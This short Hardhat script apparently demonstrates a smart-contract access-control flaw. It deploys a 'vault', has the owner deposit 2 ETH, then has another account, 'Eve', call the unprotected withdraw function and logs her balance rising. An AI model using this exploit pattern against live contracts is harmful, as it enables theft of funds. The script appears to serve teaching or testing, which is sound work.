async function main () {
    // We get the contract to deploy
    const [owner,Eve] = await ethers.getSigners();
    const Victim = await ethers.getContractFactory('vault');
    console.log('vault deployed');
    const victim = await Victim.deploy(owner.address);
    console.log("Owner stores 2 ETH")
    await victim.store({value:ethers.utils.parseEther("2.0")})
    console.log("Due to default identifiers Eve can call the withdraw function")
    console.log("Eve's balance");
    let bal1 = await Eve.getBalance();
    console.log(bal1);
    console.log("Withdrawing")
    await victim.connect(Eve).sendstored();
    console.log("Eve's new balance")
    bal1 = await Eve.getBalance();
    console.log(bal1);
  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });
